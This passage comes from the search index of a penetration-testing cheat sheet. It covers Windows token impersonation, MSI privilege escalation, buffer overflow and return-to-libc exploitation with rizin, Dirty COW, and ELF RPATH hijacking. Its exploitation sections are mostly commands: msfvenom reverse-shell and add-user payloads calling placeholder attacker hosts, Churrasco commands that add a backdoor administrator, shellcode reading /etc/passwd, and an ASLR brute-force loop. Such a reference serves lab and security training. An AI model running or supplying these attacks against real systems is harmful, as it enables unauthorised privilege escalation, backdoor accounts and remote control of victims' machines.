    "url": "http://localhost:4000/#hashes--bruteforce--decode--references",
    "relUrl": "/#hashes--bruteforce--decode--references"
  },"547": {
    "doc": "ftf-hacksheet",
    "title": "VNC",
    "content": ". | Using Aluigi vncpwd (may work on Linux):vncpwd &lt;hash-or-file&gt; . | . ",
    "url": "http://localhost:4000/#hashes--bruteforce--decode--vnc",
    "relUrl": "/#hashes--bruteforce--decode--vnc"
  },"548": {
    "doc": "ftf-hacksheet",
    "title": "Permissions",
    "content": " ",
    "url": "http://localhost:4000/#permissions",
    "relUrl": "/#permissions"
  },"549": {
    "doc": "ftf-hacksheet",
    "title": "Impersonation",
    "content": " ",
    "url": "http://localhost:4000/#permissions--impersonation",
    "relUrl": "/#permissions--impersonation"
  },"550": {
    "doc": "ftf-hacksheet",
    "title": "Windows",
    "content": " ",
    "url": "http://localhost:4000/#permissions--impersonation--windows",
    "relUrl": "/#permissions--impersonation--windows"
  },"551": {
    "doc": "ftf-hacksheet",
    "title": "Check Privileges",
    "content": ". | Check if the current user has impersonation permissions:whoami /priv :: Check the SeImpersonatePrivilege :: or SeAssignPrimaryTokenPrivilege . | Service accounts usually have this ability | . ",
    "url": "http://localhost:4000/#permissions--impersonation--windows--check-privileges",
    "relUrl": "/#permissions--impersonation--windows--check-privileges"
  },"552": {
    "doc": "ftf-hacksheet",
    "title": "Juicy Potato",
    "content": ". | Impersonating with Juicy Potato::: msfvenom &lt;rev-shell&gt;.exe JuicyPotato -l &lt;non-used-port&gt; -t * -p &lt;rev-shell&gt;.exe . | . ",
    "url": "http://localhost:4000/#permissions--impersonation--windows--juicy-potato",
    "relUrl": "/#permissions--impersonation--windows--juicy-potato"
  },"553": {
    "doc": "ftf-hacksheet",
    "title": "Chimichurri - IIS 7/7.5",
    "content": ". | Use Chimichurri (future: new version)::: Spawn a reverse shell on IP:PORT Chimichurri &lt;lhost&gt; &lt;lport&gt; . | . ",
    "url": "http://localhost:4000/#permissions--impersonation--windows--chimichurri---iis-7-7-5",
    "relUrl": "/#permissions--impersonation--windows--chimichurri---iis-7-7-5"
  },"554": {
    "doc": "ftf-hacksheet",
    "title": "Churraskito - IIS 6",
    "content": ". | Use Churraskito (stdafx.h included)::: Spawn a reverse shell on IP:PORT churraskito &lt;lhost&gt; &lt;lport&gt; . | . ",
    "url": "http://localhost:4000/#permissions--impersonation--windows--churraskito---iis-6",
    "relUrl": "/#permissions--impersonation--windows--churraskito---iis-6"
  },"555": {
    "doc": "ftf-hacksheet",
    "title": "Churrasco - Windows Server 2003 - IIS 6",
    "content": ". | Execute commands with Churrasco::: Usage: churrasco -d \"&lt;cmd&gt;\" churrasco -d \"cmd.exe\" :: Running cmd.exe is not immediate :: + may overlap with non-SYSTEM cmd :: Add backdoor user churrasco -d \"net user backup backup\" churrasco -d \"net localgroup administrators backup /add\" . | . ",
    "url": "http://localhost:4000/#permissions--impersonation--windows--churrasco---windows-server-2003---iis-6",
    "relUrl": "/#permissions--impersonation--windows--churrasco---windows-server-2003---iis-6"
  },"556": {
    "doc": "ftf-hacksheet",
    "title": "Installation",
    "content": " ",
    "url": "http://localhost:4000/#permissions--installation",
    "relUrl": "/#permissions--installation"
  },"557": {
    "doc": "ftf-hacksheet",
    "title": "Windows - MSI",
    "content": ". | Check whether the current user can install MSI with elevated privileges:reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated :: Or the machine in general reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated . | Create an evil MSI:# Shell msfvenom -p windows/shell_reverse_tcp LHOST=&lt;local-ip&gt; LPORT=&lt;listening-port&gt; EXITFUNC=thread -f msi -o shell.msi # New user msfvenom -p windows/adduser USER=backup PASS=backup -f msi -o user.msi . | Execute it:msiexec /quiet /qn /i &lt;file-path&gt;.msi . | . ",
    "url": "http://localhost:4000/#permissions--installation--windows---msi",
    "relUrl": "/#permissions--installation--windows---msi"
  },"558": {
    "doc": "ftf-hacksheet",
    "title": "Buffer Overflow",
    "content": " ",
    "url": "http://localhost:4000/#buffer-overflow",
    "relUrl": "/#buffer-overflow"
  },"559": {
    "doc": "ftf-hacksheet",
    "title": "Security Features Meaning",
    "content": " ",
    "url": "http://localhost:4000/#buffer-overflow--security-features-meaning",
    "relUrl": "/#buffer-overflow--security-features-meaning"
  },"560": {
    "doc": "ftf-hacksheet",
    "title": "ASLR",
    "content": ". | Base address randomization of loaded applications and libraries | Check:cat /proc/sys/kernel/randomize_va_space # 0 -&gt; Disabled ldd &lt;file&gt; # Run it multiple times # Libs in different address each time . | Prevents return to libc | Bypass with bruteforce-return to libc or return to plt if PIE is disabled and system (or any other privesc function) is used by the binary | . ",
    "url": "http://localhost:4000/#buffer-overflow--security-features-meaning--aslr",
    "relUrl": "/#buffer-overflow--security-features-meaning--aslr"
  },"561": {
    "doc": "ftf-hacksheet",
    "title": "PIE / PIC",
    "content": ". | Position Independent Executable / Code | Does the same than ASLR but for the binaries address space when executed | Check with checksec | Prevents return to plt | . ",
    "url": "http://localhost:4000/#buffer-overflow--security-features-meaning--pie---pic",
    "relUrl": "/#buffer-overflow--security-features-meaning--pie---pic"
  },"562": {
    "doc": "ftf-hacksheet",
    "title": "Canaries",
    "content": ". | Bytes that, when overridden, terminate the program | Check with checksec | Bypass by leaking their address | . ",
    "url": "http://localhost:4000/#buffer-overflow--security-features-meaning--canaries",
    "relUrl": "/#buffer-overflow--security-features-meaning--canaries"
  },"563": {
    "doc": "ftf-hacksheet",
    "title": "DEP / NX",
    "content": ". | Data Execution Prevention / No eXecute | Prevent executing data (shellcode) from the memory (stack, heap, etc) | Check with checksec | Bypass with return to libc | . ",
    "url": "http://localhost:4000/#buffer-overflow--security-features-meaning--dep---nx",
    "relUrl": "/#buffer-overflow--security-features-meaning--dep---nx"
  },"564": {
    "doc": "ftf-hacksheet",
    "title": "RELRO",
    "content": ". | RELocation Read Only | Makes the relocation sections used to resolve dynamically loaded functions (GOT) read-only by resolving them at beginning of execution | Full RELRO prevents GOT override | . ",
    "url": "http://localhost:4000/#buffer-overflow--security-features-meaning--relro",
    "relUrl": "/#buffer-overflow--security-features-meaning--relro"
  },"565": {
    "doc": "ftf-hacksheet",
    "title": "Checksec",
    "content": ". | Site - check the properties of binaries:checksec --file=&lt;file&gt; # Multiple files: --listfile=&lt;list&gt; # Running process: --proc=&lt;name&gt; # Running proc libs: --proc-libs=&lt;pid&gt; # All running procs: --proc-all . | . ",
    "url": "http://localhost:4000/#buffer-overflow--checksec",
    "relUrl": "/#buffer-overflow--checksec"
  },"566": {
    "doc": "ftf-hacksheet",
    "title": "Identify Badchars",
    "content": " ",
    "url": "http://localhost:4000/#buffer-overflow--identify-badchars",
    "relUrl": "/#buffer-overflow--identify-badchars"
  },"567": {
    "doc": "ftf-hacksheet",
    "title": "Shell - Bash/Zsh",
    "content": ". | Chars generation:# All: 0102030405060708090a... seq 255 | xargs printf '%02x' # All but 01|0a: 0203040506070809... seq 255 | awk -v ORS= '($0=sprintf(\"%02x\",$0))!~/01|0a/' # Feed all hex as input in bash/zsh printf $(seq 255 | xargs printf '\\\\x%02x') # Feed some hex as input in bash/zsh printf $(seq 255 | awk -v ORS= '($0=sprintf(\"\\\\x%02x\",$0))!~/01|0a/') . | . ",
    "url": "http://localhost:4000/#buffer-overflow--identify-badchars--shell---bash-zsh",
    "relUrl": "/#buffer-overflow--identify-badchars--shell---bash-zsh"
  },"568": {
    "doc": "ftf-hacksheet",
    "title": "exploit-bad-characters",
    "content": ". | Site - Python library to generate and filter bad chars | . ",
    "url": "http://localhost:4000/#buffer-overflow--identify-badchars--exploit-bad-characters",
    "relUrl": "/#buffer-overflow--identify-badchars--exploit-bad-characters"
  },"569": {
    "doc": "ftf-hacksheet",
    "title": "expdevBadChars",
    "content": ". | Site - good/bad buffer char comparer . | Use px 255 @r:SP as &#8220;bad buffer&#8221; | . | . ",
    "url": "http://localhost:4000/#buffer-overflow--identify-badchars--expdevbadchars",
    "relUrl": "/#buffer-overflow--identify-badchars--expdevbadchars"
  },"570": {
    "doc": "ftf-hacksheet",
    "title": "Rizin",
    "content": ". | Reopen binary with all bytes as input:# Quotes may be necessary around $() ood $(\"!printf $(seq 255 | xargs printf '\\\\\\\\x%02x')\") . | Find bytes that made it to the stack:# Expected output: 01020304...ff px0 255 @r:SP # Some bytes may be slightly changed # Use expdevBadChars to locate them . | . ",
    "url": "http://localhost:4000/#buffer-overflow--identify-badchars--rizin",
    "relUrl": "/#buffer-overflow--identify-badchars--rizin"
  },"571": {
    "doc": "ftf-hacksheet",
    "title": "Rizin",
    "content": " ",
    "url": "http://localhost:4000/#buffer-overflow--rizin",
    "relUrl": "/#buffer-overflow--rizin"
  },"572": {
    "doc": "ftf-hacksheet",
    "title": "Resources",
    "content": ". | Project - Docs - Official Page | . ",
    "url": "http://localhost:4000/#buffer-overflow--rizin--resources",
    "relUrl": "/#buffer-overflow--rizin--resources"
  },"573": {
    "doc": "ftf-hacksheet",
    "title": "Troubleshoot",
    "content": ". | If the payload segfaults the binary it may be due to a misaligned stack: . | Either use NOPs as padding (before and after the payload) | Or add a ret after the offset to IP and before the shellcode - Ref | . | If the BoF happens in a forked child and e dbg.follow.child=true or dpc pid don&#8217;t help, use the shell to attach:# Attach newest &lt;bin&gt; in debug mode # Continue proc + close fd afterwards o dbg://$(!pgrep -n &lt;bin&gt;); dc; o-* # Or the same from the shell rizin -c 'dc; o-*' -d $(pgrep -n &lt;bin&gt;) . | . ",
    "url": "http://localhost:4000/#buffer-overflow--rizin--troubleshoot",
    "relUrl": "/#buffer-overflow--rizin--troubleshoot"
  },"574": {
    "doc": "ftf-hacksheet",
    "title": "Most useful commands",
    "content": "# Analysis aa # Almost-all analysis aaa # Deepest analysis al # Analyze func commands afva # Function variable/args... afu &lt;addr&gt; # Analyze func until addr # Files o [&lt;file&gt;] # List fds/open new file oi[-] [file] # Ext fd info/close by idx oo[+] # Reopen file [in rw] ood [args] # Reopen in debug + args oodf [file] # Reopen debug + file oodr [rzrun] # Reopen debug + rz-run oC &lt;len&gt; # New-fd memcpy len bytes o-&lt;fd&gt; # Close file by fd o-* # Close all fds o-! # Close all fds - selected ox &lt;f&gt; &lt;x&gt; # Exchange fds f and x o &lt;file&gt; &lt;addr&gt; &lt;mode&gt; # Map file on &lt;file&gt; &lt;addr&gt; # Map file no rz_bin e cmd.open=&lt;cmd&gt; # Run cmd after open # File information iI # Magic, compiler, security... ieee # Entry and exitpoints is # Symbols ii # Imports # Strings in .data and the whole file iz ~&lt;grep-search&gt; izz # Append a `q' for less verbosity # Fast-search the output in HUD mode izz ~{:... # {: -&gt; Pretty format # {: format is recommended for HUD as # it seems to ignore unaligned text # HUD mode &lt;arrows&gt; # Select a result &lt;Enter&gt; # Seek to address # Grep rows and cols numbers izz ~:&lt;row-ini&gt;..&lt;row-end&gt;[&lt;col&gt;] izz ~&lt;search-term&gt;[&lt;col-ini&gt;-&lt;col-end&gt;] izz ~:4[&lt;col1&gt;,&lt;col5&gt;] izz ~+..&lt;search&gt; # i-case + less pager # Seek to.. s `ieq` # Entrypoint (alt: entry0) sa &lt;align&gt; # Alignment sf. # Beginning of current func sf [&lt;func&gt;] # Next/specific function sr &lt;reg&gt; # Register shu # Previous seek (undo) shr # Next seek (redo) # Show current seek position 0 padded spad # Debug files/processes/threads... o dbg://&lt;f&gt; # Debug file/pid in new-fd dd [&lt;file&gt;] # Show/open file (?) doo [args] # Reopen file in debug mode doof [file] # Reopen file in debug mode dor [rzrun] # Set rz-run opts ',' sep doc # Close debug session dd-&lt;fd&gt; # Close file descriptor dp [&lt;pid&gt;] # Show pid+children of pid dpl # Show all attachable pids dpa &lt;pid&gt; # Attach (and select) pid dp=&lt;pid&gt; # Select pid dpc[*] # Select/Display forked pid dpn # Fork in a new process dpk &lt;p&gt; [&lt;s&gt;] # Send signal &lt;s&gt; to &lt;p&gt; dpt [&lt;pid&gt;] # Show threads of pid dpt=&lt;thrd&gt; # Attach to thread dptn # Clone in a new thread e cmd.load=&lt;cmd&gt; # Run cmd after load # Debug step/continue... dsp # Step until program starts ds [&lt;num&gt;] # Step one/num instructions dso [&lt;num&gt;] # Step over one/num instr dss &lt;num&gt; # Skip num instructions dsu &lt;addr&gt; # Step until address dsi &lt;cond&gt; # Step until condition dsl [&lt;num&gt;] # Step one/num code lines dsb # Step back (tracing req) dc [&lt;pid&gt;] # Continue all/one pids dcb # Continue back (tracing) dcu &lt;multi&gt; # Continue until addr/range dcr # Continue until return dcc # Continue until call # Breakpoints... db &lt;addr&gt; # Create one in address dbH &lt;addr&gt; # Create a hardware one dbc &lt;addr&gt; &lt;cmd&gt; # Run command at brkp dbn [&lt;name&gt;] # Show/name current breakp db # Show defined dbs &lt;addr&gt; # Toggle breakpoint db-&lt;addr&gt; # Remove breakpoint drx-&lt;num&gt; # Remove hardware breakp dbts &lt;addr&gt; # Toggle tracing dbt # Show backtraces dt [&lt;addr&gt;] # Show traces dts+/- # Start/Stop trace session dtg # Show trace graph dtgi # Interactive trace dtsm # List trace memory-map e cmd.bp=&lt;cmd&gt; # Run cmd on bp hit e cmd.hitinfo=0 # Hide bp info when hit # Registers... dr= # Show in columns dr &lt;reg&gt;=&lt;val&gt; # Set value dr?&lt;reg&gt; # Show value: ? optional dr?? # Show values + roles drd # Show modified only dro # Show previous values drr # Show refs: telescoping # Objects... pf S @obj.&lt;name&gt; # Show stored string pf p @obj.&lt;name&gt;+8 # Show length 64bit # Disassemble... all accept &lt;num&gt; instr pds # Call summary pC # Print in columns pdf # Print function pdr # Show recursive call graph # 10 bytes before + 10 after: Noted-hex pxc 20 @ $$ - 10 # 20 bytes with text convertion in ESP pxz 20 @ esp # Detailed hex + jump references notes pxr # Locate usage of addresses (use aa) axt [&lt;addr&gt;] # Refs to this address axf [&lt;addr&gt;] # Refs from this address ax. [&lt;addr&gt;] # Refs from/to this addr axff [&lt;addr&gt;] # Refs from this funct ax ~... # All references HUD mode axg [&lt;addr&gt;] # Current func call-graph afl # List analyzed functions afi # Verbose afl afM &lt;func&gt; # Show function map afo # Show function address afx # Show functions refs afvx # Show funcs vars refs afvxv # Funcs local vars refs afv # Show function variables afvd # Funcs vars/args value afvr # Reg-based args/locals afvs # Stack-based args/locals afvb # Base-pointer arg/locals afv= # Funcs vars/args drefs afvf # Show rel stackframe var afbr # Func exit instr addrs # Rename afvn &lt;name&gt; [&lt;old&gt;] # Func arg/var afvr &lt;reg&gt; &lt;name&gt; [t] # Reg local arg afvs &lt;del&gt; &lt;name&gt; [t] # Stack local arg afvb &lt;del&gt; &lt;name&gt; [t] # B-ptr local arg # Show function parameters as arg[&lt;n&gt;] e dbg.funcarg=true # Memory maps iSq # Sections - iS= is prettier iSS # Mem segments om # om= is prettier - def IO map im # Predefined memory dm # List current pid mem map dmm # List modules/libraries in mem dmh # Show heap map dmhg # Show head graph dmha # Show all malloc state info dmhbg # Doubly-linked-list heap graph dmi &lt;lib/addr&gt; [&lt;sym&gt;] # Lib symbols dmia &lt;lib/addr&gt; # All lib info # Run command on search hit e cmd.hit=&lt;cmd&gt; # Limit search results to 1 e search.maxhits=1 # Define memory location to search e search.in=dbg.maps # Gadget search (hex) in address range /a jmp esp @( &lt;addr-ini&gt; &lt;addr-end&gt; ) # Or set default search ranges e search.from=&lt;addr&gt; e search.to=&lt;addr&gt; # Fine-tune to mem types e search.in=dbg.maps.rx # Seek to the first search hit s/ # Flagspace fs search # Select search flag space f ~{:... # All flags in space - HUD fs * # Select all flag spaces fN # Name of tag at point ff [glob] # Bytes to next/match flag f+&lt;name&gt; &lt;v&gt; # Create/set flag value fz[-][name] # Show/New/Del flag zone ft[-][tag] [val] # Show/New/Del tags # Interactive option-setter view Veq # Press _ for HUD mode fast-set # Find the meaning of an option in HUD ell ~{:... # {: -&gt; Pretty format # Remove {: to hide unaligned options # Not possible to set values like this # Follow forked children e dbg.follow.child=true # Stop execution when forked child ends e dbg.forks=true # Interrupt all threads if rizin stops e dbg.threads=true # Trace program and in a given range e dbg.trace=true e dbg.trace.inrange=true dtc &lt;from&gt; &lt;to&gt; # Don't interrupt before syscalls e dbg.aftersyscall=false # Run command when a syscall is hit e cmd.onsyscall=&lt;cmd&gt; # Disable ASLR (may require sudo) e io.aslr=true # Change endianness and architecture e! cfg.bigendian # e! Toggles boolean e asm.arch=&lt;arch&gt; # Changes will only be done in memory e io.cache=true e io.pcache=true # Show all sub-configurations of key: es io # Display cache, pcache, aslr.. # Override memory with two Intel NOPs wx 9090 @&lt;location&gt; # wxs - seek after # Convert... ?x &lt;str&gt; # String to hexpairs ?x- &lt;hexp&gt; # Hexpair to string ?vi &lt;expr&gt; # Expression to decimal ?= &lt;expr&gt; # Expression to hex and dec ?X &lt;expr&gt; # Expression to hex ?v &lt;expr&gt; # Expression to 0x+hex ?x+ &lt;expr&gt; # ?v honoring endianness ?o &lt;expr&gt; # Expression to octal ?b &lt;expr&gt; # Expression to binary ? &lt;expr&gt; # Expression to multi-format ?u &lt;num&gt; # Number to human units ?p &lt;vaddr&gt; # Virtual to Physical addr ?P &lt;paddr&gt; # Physical to Virtual addr ?b64[-] &lt;str&gt; # String from/to base 64 # Generate... ?s &lt;f&gt; &lt;t&gt; &lt;s&gt; # Sequence: from-to-step ?r &lt;f&gt; &lt;t&gt; # Random number in range # Show... ?h &lt;str&gt; # String hash ?l &lt;str&gt; # String length ?a # ASCII table # Visual/Panels view V # Visual view (from prompt) v # Panels view (from prompt) V # Graph view (from visual/panels) SPC # Switch to Graph/Panels view ! # Switch to Visual/Panels view p/n # Previous/Next mode _ # HUD view \\ # User-friendly view d1 # Bit editor (from visual/panels) m # Un/Select menu c # Enable/disable cursor b # Toggle breakpoint at cursor g # Seek to offset / # Highlight G # Seek to highlight n/N # Seek to next/prev func/flag/hit 1-9 # Follow jmp/call shortcut id u/U # Undo/Redo seek x # Show x/refs from/to data/code r # Toggle call/jmp/lea hints s/S # Step in/over (debug) :dc # Debug continue i # Insert hex &amp; # Toggle cache . ",
    "url": "http://localhost:4000/#buffer-overflow--rizin--most-useful-commands",
    "relUrl": "/#buffer-overflow--rizin--most-useful-commands"
  },"575": {
    "doc": "ftf-hacksheet",
    "title": "Control Instr-Ptr/Program-Counter",
    "content": ". | Execute after: rizin &lt;binary/pid&gt;# Reopen (debug) with De Bruijn input ood $(?x- $(wopD* &lt;len&gt; ~[1])); dc # Find De Bruijn offset at point (IP) wopO `s` # Explicit EIP reg: wopO `dr eip` # Reopen (debug) to check the offset ood \"$(?x- $(wopD* &lt;offset&gt; ~[1]))TEST\"; dc; ?x- 0x$(?x+ $(dr PC)) # TEST should appear; if TSET, try: e cfg.bigendian=1 # Change endianness e asm.arch=&lt;arch&gt; # See: e asm.arch=? . | Or use rz-gg for IP/PC control:# Generate De Bruijn string pattern rz-gg -P &lt;len&gt; -r # Hex: remove -r # Identify offset at address: rz-gg -q 0x&lt;addr&gt; # Example: rz-gg -q 0x$(rz-gg -P 100 | tail -c-9) # Output: 96 |though wrong endianness . | . ",
    "url": "http://localhost:4000/#buffer-overflow--rizin--control-instr-ptr-program-counter",
    "relUrl": "/#buffer-overflow--rizin--control-instr-ptr-program-counter"
  },"576": {
    "doc": "ftf-hacksheet",
    "title": "Locate Jump / Gadget Address",
    "content": "# Set memory search location e search.in=dbg.maps # Limit search results to 1 e search.maxhits=1 # Assemble and search by opcode /a jmp esp @( `dmm ~&lt;bin&gt;[0,1]` ) # Get address respecting endianness ?x+ hit0_0 # Find the De Bruijn offset until SP wopO 0x`px0 4 @r:SP` # Seek to first hit if necessary s/ . ",
    "url": "http://localhost:4000/#buffer-overflow--rizin--locate-jump---gadget-address",
    "relUrl": "/#buffer-overflow--rizin--locate-jump---gadget-address"
  },"577": {
    "doc": "ftf-hacksheet",
    "title": "Memory Execution",
    "content": ". | Only possible if DEP/NX is disabled | Send, in the input string, the payload &lt;IP-offset&gt;&lt;SP-JMP&gt;&lt;SP-offset&gt;&lt;shcode&gt; | Limit the shellcode to buffer sizes:# Make a simple exec first msfvenom -p linux/x86/exec CMD='whoami' EXITFUNC=thread -f c -b \"\\x&lt;bchar1&gt;\\x&lt;bchar2&gt;\" # rz-gg also has an exec shellcode # If only exec works, use a bash wrap # CMD='bash -c \\\"&lt;cmd&gt;\\\"', and base64 # (without -w 0) for file transfers # Fallback to try reading a file msfvenom -p linux/x86/read_file PATH=/etc/passwd EXITFUNC=thread -f c -b \"\\x&lt;bchar1&gt;\\x&lt;bchar2&gt;\" # Write hex payload to file with pipe # | sed -n 's/\";\\?//gp' | tr -d '\\n' # To use as: &lt;bin&gt; $(printf $(cat p)) # Move to a reverse shell if it works msfvenom -p linux/x86/shell_reverse_tcp LHOST=&lt;lip&gt; LPORT=&lt;lport&gt; EXITFUNC=thread -f c -b \"\\x&lt;bchars&gt;\" # Use the staged payload version if # the size surpasses the buffer limit linux/x86/shell/reverse_tcp # Try bind shell if it doesn't work # Fallback to socket-reuse payloads searchsploit -x 34060 # Or 47530 # Maybe MS linux/x86/shell_find_port? # Encode custom payloads bchars: msfvenom -p generic/custom PAYLOADSTR=\"&lt;payload&gt;\" EXITFUNC=thread -f c -b \"\\x&lt;bchars&gt;\" # Or from file PAYLOADFILE=&lt;file&gt; . | Socket-reuse tutorial | . ",
    "url": "http://localhost:4000/#buffer-overflow--rizin--memory-execution",
    "relUrl": "/#buffer-overflow--rizin--memory-execution"
  },"578": {
    "doc": "ftf-hacksheet",
    "title": "Return to libc",
    "content": ". | Only feasible if PIE is disabled | Locate libc address:# Interpreter should be: ld-linux.so readelf -l &lt;file&gt; | grep interpreter # man ldd -&gt; search for Security # Find the address ldd &lt;file&gt; | grep libc # Perform relocations &amp; check missing ldd -r &lt;file&gt; | grep libc . | If ASLR is enabled, run ldd many times and note the number of altered bytes:# zsh - all possibilities for 3 bytes echo $[ 8 ** 3 ] # 512 -&gt; 511 possibilities to fail # zsh - guesses to succeed worst case echo $[ 1 - (511.0/512) ** 3000 ] . | Get the offsets of system, exit and sh:# system and exit readelf -s &lt;libc.so.6&gt; | grep \" system@\\| exit@\" # /bin/sh strings -a -t x &lt;libc.so.6&gt; | grep \"/bin/\" # /bin/sh is just a string, you can # even provide it as input to the bin . | Assemble the libc functions in rizin:# ?x+ outputs honoring the endianness ?x+ &lt;libc-base&gt; + &lt;func-offset&gt; | sed 's/../\\\\x&amp;/g' # &lt;func-offset&gt;: system or exit or sh # Use any libc base if enabled ASLR . | Check for badchars | TODO Find how to encode+decode system, exit and/or sh using rz-gg | Overflow:# bash/zsh - their printf convert hex &lt;file&gt; \"$(printf \"%&lt;offset-to-ip&gt;s&lt;hex-system-exit-sh&gt;\\n\")\" # ^Uses space padding, alter if bchar # If bash/zsh are not available &lt;file&gt; \"$(perl -e 'print \"A\"x&lt;offset-to-ip&gt;,\"&lt;hex-system-exit-sh&gt;\",\"\\n\"')\" # perl is an openssl dependency # If print doesn't accept \\x use: &lt;file&gt; \"$(perl -e 'print \"A\"x&lt;offset-to-ip&gt;,(pack \"H*\",\"&lt;hex-system-exit-sh-no-\\x&gt;\"),\"\\n\"')\" # pack expects hex like: 434241 (CBA) # bash/zsh - ASLR enabled bruteforce i=0; pay=\"$(printf \"%&lt;offset-to-ip&gt;s&lt;hex-system-exit-sh&gt;\\n\")\"; until &lt;file&gt; \"$pay\"; do echo -e \"\\033[1A\\033[2KTry $((++i))\"; done # TODO - Find a way for parallelizing . | . ",
    "url": "http://localhost:4000/#buffer-overflow--rizin--return-to-libc",
    "relUrl": "/#buffer-overflow--rizin--return-to-libc"
  },"579": {
    "doc": "ftf-hacksheet",
    "title": "Return to PLT",
    "content": ". | Requires that system is used in the binary | It is similar to return to libc - See | The only difference is that one needs to find the address of system in the binary address, which is the same on each execution (check the PLT with rz) | Maybe the location in the PLT?objdump -R &lt;file&gt; | grep -i libc . | . ",
    "url": "http://localhost:4000/#buffer-overflow--rizin--return-to-plt",
    "relUrl": "/#buffer-overflow--rizin--return-to-plt"
  },"580": {
    "doc": "ftf-hacksheet",
    "title": "More Advanced Techniques",
    "content": ". | Making the stack writable again | Override GOT Table | Leaking unknown libc | Canary, NX and PIE bypass - ROP | Others: 1 | Bypassing ASLR: 1, 2, 3 | . ",
    "url": "http://localhost:4000/#buffer-overflow--rizin--more-advanced-techniques",
    "relUrl": "/#buffer-overflow--rizin--more-advanced-techniques"
  },"581": {
    "doc": "ftf-hacksheet",
    "title": "Binaries",
    "content": " ",
    "url": "http://localhost:4000/#binaries",
    "relUrl": "/#binaries"
  },"582": {
    "doc": "ftf-hacksheet",
    "title": "Reading",
    "content": " ",
    "url": "http://localhost:4000/#binaries--reading",
    "relUrl": "/#binaries--reading"
  },"583": {
    "doc": "ftf-hacksheet",
    "title": "grep",
    "content": "# Look for a string related to a search grep --binary-files=text --context=100 '&lt;search&gt;' &lt;bin&gt; # -a -&gt; --binary-files=text # --context/-C - Show &lt;n&gt; lines bef/aft . ",
    "url": "http://localhost:4000/#binaries--reading--grep",
    "relUrl": "/#binaries--reading--grep"
  },"584": {
    "doc": "ftf-hacksheet",
    "title": "strings",
    "content": "# Show all strings in binary strings &lt;bin&gt; . ",
    "url": "http://localhost:4000/#binaries--reading--strings",
    "relUrl": "/#binaries--reading--strings"
  },"585": {
    "doc": "ftf-hacksheet",
    "title": "Tracing",
    "content": " ",
    "url": "http://localhost:4000/#binaries--tracing",
    "relUrl": "/#binaries--tracing"
  },"586": {
    "doc": "ftf-hacksheet",
    "title": "strace",
    "content": ". | Trace system calls:strace &lt;bin&gt; . | . ",
    "url": "http://localhost:4000/#binaries--tracing--strace",
    "relUrl": "/#binaries--tracing--strace"
  },"587": {
    "doc": "ftf-hacksheet",
    "title": "ltrace",
    "content": ". | Trace libraries and system calls:ltrace &lt;bin&gt; # Use -S for output similar to strace . | . ",
    "url": "http://localhost:4000/#binaries--tracing--ltrace",
    "relUrl": "/#binaries--tracing--ltrace"
  },"588": {
    "doc": "ftf-hacksheet",
    "title": "Linux",
    "content": " ",
    "url": "http://localhost:4000/#linux",
    "relUrl": "/#linux"
  },"589": {
    "doc": "ftf-hacksheet",
    "title": "Kernel Exploits",
    "content": " ",
    "url": "http://localhost:4000/#linux--kernel-exploits",
    "relUrl": "/#linux--kernel-exploits"
  },"590": {
    "doc": "ftf-hacksheet",
    "title": "Dirty COW - CVE-2016-5195",
    "content": " ",
    "url": "http://localhost:4000/#linux--kernel-exploits--dirty-cow---cve-2016-5195",
    "relUrl": "/#linux--kernel-exploits--dirty-cow---cve-2016-5195"
  },"591": {
    "doc": "ftf-hacksheet",
    "title": "Kernels Affected",
    "content": ". | Reference | Range: 2.6.22 &lt; 4.8.3, 4.7.9, 4.4.26 | . ",
    "url": "http://localhost:4000/#linux--kernel-exploits--dirty-cow---cve-2016-5195--kernels-affected",
    "relUrl": "/#linux--kernel-exploits--dirty-cow---cve-2016-5195--kernels-affected"
  },"592": {
    "doc": "ftf-hacksheet",
    "title": "Effect",
    "content": ". | Modify files with root privileges | From adding root users to create SUID files (by modifying existing) | . ",
    "url": "http://localhost:4000/#linux--kernel-exploits--dirty-cow---cve-2016-5195--effect",
    "relUrl": "/#linux--kernel-exploits--dirty-cow---cve-2016-5195--effect"
  },"593": {
    "doc": "ftf-hacksheet",
    "title": "Patched Old Kernels",
    "content": "| Kernel | Distro | . | 3.2.0-113.155 | Ubuntu 12.04 LTS | . | 3.13.0-100.147 | Ubuntu 14.04 LTS | . | 3.16.36-1+deb8u2 | Debian 8 | . | 4.4.0-45.66 | Ubuntu 16.04 LTS | . | 4.8.0-26.28 | Ubuntu 16.10 | . | 3.10.0-327.36.3 | RHEL 7, CentOS 7 | . | 2.6.32-642.6.2 | RHEL 6, CentOS 6 | . | 2.6.18-416 | RHEL 5, CentOS 5 | . | 3.0.101-84.1 | SLES 11 SP4 | . | 3.12.60-52.57.1 | SLES 12 GA LTSS | . | 3.12.62-60.64.8.2 | SLES 12 SP1 | . ",
    "url": "http://localhost:4000/#linux--kernel-exploits--dirty-cow---cve-2016-5195--patched-old-kernels",
    "relUrl": "/#linux--kernel-exploits--dirty-cow---cve-2016-5195--patched-old-kernels"
  },"594": {
    "doc": "ftf-hacksheet",
    "title": "Working Exploits",
    "content": ". | 2.6.24-16 - EID 40839 (add root user) . | Check the exploit for the gcc flags | Make the exploit stable | . | List of PoC | . ",
    "url": "http://localhost:4000/#linux--kernel-exploits--dirty-cow---cve-2016-5195--working-exploits",
    "relUrl": "/#linux--kernel-exploits--dirty-cow---cve-2016-5195--working-exploits"
  },"595": {
    "doc": "ftf-hacksheet",
    "title": "ELF Vulnerabilities",
    "content": " ",
    "url": "http://localhost:4000/#linux--elf-vulnerabilities",
    "relUrl": "/#linux--elf-vulnerabilities"
  },"596": {
    "doc": "ftf-hacksheet",
    "title": "Identification",
    "content": ". | Identify with checksec:find / \\( -perm -4000 -o -perm -2000 \\) -type f -exec /tmp/checksec --file={} \\; 2&gt;/dev/null | less -R -S # Use --listfile=&lt;file&gt; instead # --proc=&lt;pid&gt; and --proc-libs=&lt;pid&gt; # to analyze a running process or # --proc-all for all processes . | . ",
    "url": "http://localhost:4000/#linux--elf-vulnerabilities--identification",
    "relUrl": "/#linux--elf-vulnerabilities--identification"
  },"597": {
    "doc": "ftf-hacksheet",
    "title": "RPATH",
    "content": ". | The ELFs shall have RW-RPATH | Identify the RPATH and the name of the libraries:readelf -d /usr/bin/sudo | grep \"NEEDED\\|RPATH\" # Or strace /usr/bin/sudo 2&gt;&amp;1 | grep -i \"open\\|access\\|no such file\" . | Check if the directory or existing-libraries are writable | Replace them (or create a new one) that spawns a shell with SUID | . ",
    "url": "http://localhost:4000/#linux--elf-vulnerabilities--rpath",
